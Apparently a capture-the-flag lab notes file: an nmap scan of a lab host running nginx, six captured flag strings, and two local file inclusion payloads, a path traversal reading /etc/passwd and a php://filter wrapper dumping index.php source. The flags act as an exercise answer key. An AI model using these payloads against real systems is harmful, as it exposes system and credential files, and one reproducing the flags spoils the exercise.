**Nmap scan result**
```bash nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 21:54 GMT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.88% done; ETC: 21:54 (0:00:00 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.17% done; ETC: 21:54 (0:00:00 remaining)
Nmap scan report for 10.0.160.9
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
80/tcp    open     http    nginx 1.10.3
54045/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/17%OT=80%CT=1%CU=33955%PV=Y%DS=2%DC=I%G=Y%TM=66E9
OS:FB5A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=RI%II=I%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=RI%II=I%TS=A)OPS(O1=M550ST11NW7%O2=M55
OS:0ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST11)WIN(W
OS:1=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=N%T=40%W=FD5C%
OS:O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=N%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=41%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=41%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)
```

**Flag 1**
1. ETSCTF_FLAG_IN_SOURCE

**Flag 2**
ETSCTF_0e6e8bf3fc6b02cdcf22a5d7b71b466d

**Flag 3**
ETSCTF_ETCPASSWD_FLAG_HIDDEN_HOLA

**Flag 4**
ETSCTF_FLAG_IN_PHP_AFTER_LFI
**Flag 5**
ETSCTF_FLAG_IN_CONF18_FILE

**Flag 6**
ETSCTF_341a1eea621ae5dbd0467911860187bc #var/www/html/admin/ETSCTF.html



`LFI payloads`
10.0.160.9/?page=../../../../../../../../../../../../../../etc/passwd
http://lfi-tutorial.echocity-f.com/?page=php://filter/convert.base64-encode/resource=index.php


